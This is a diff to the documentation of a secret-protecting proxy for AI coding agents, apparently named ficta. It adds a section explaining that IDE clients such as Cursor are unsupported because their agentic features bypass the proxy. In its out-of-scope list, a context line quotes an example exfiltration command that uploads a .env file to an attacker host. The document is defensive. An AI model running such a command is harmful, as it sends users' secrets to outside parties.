@@ -35,6 +35,28 @@ include this scope.
 - Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system.
 - Binary responses.
 - Secrets the agent reads or sends outside the proxied model API channel.
+- IDE clients that do not route all model traffic through the proxy, for example Cursor, whose Agent / Edit / Tab / Composer features bypass a custom base URL. See [IDE clients](#ide-clients-cursor-etc) below.
+
+## IDE clients (Cursor, etc.)
+
+ficta's exact-match promise requires that **all** of a client's model traffic pass through the
+local proxy. CLI agents (`claude`, `codex`, `pi`) satisfy this — their base-URL override
+(`ANTHROPIC_BASE_URL` and equivalents) captures every model request.
+
+IDE clients like **Cursor** do not, so they are **not supported**:
+
+- Cursor's base-URL override only routes its **chat/plan panel with a custom OpenAI-compatible model** to a local endpoint.
+- The agentic features that actually read your files and `.env` — **Agent, Composer, Edit/Apply, Tab** — stay on Cursor's own backend and first-party models and never reach the proxy. Default first-party model usage also transits Cursor's servers.
+
+This is **partial coverage**, which for a secret airlock is worse than none: a `.env` value swept
+into Agent context is sent to the provider verbatim while the user believes ficta is protecting
+them. Pointing Cursor at the ficta proxy would cover only chat-panel custom-model requests and
+silently leak the dominant agentic path. Per the positioning guardrails below, ficta must not
+claim Cursor protection on that basis.
+
+If a future Cursor build routes **all** model traffic (including Agent/Edit/Tab) through a
+user-controlled base URL, revisit this — full coverage would make the same exact-match promise
+honest there too.
 
 ## Design tradeoffs
 
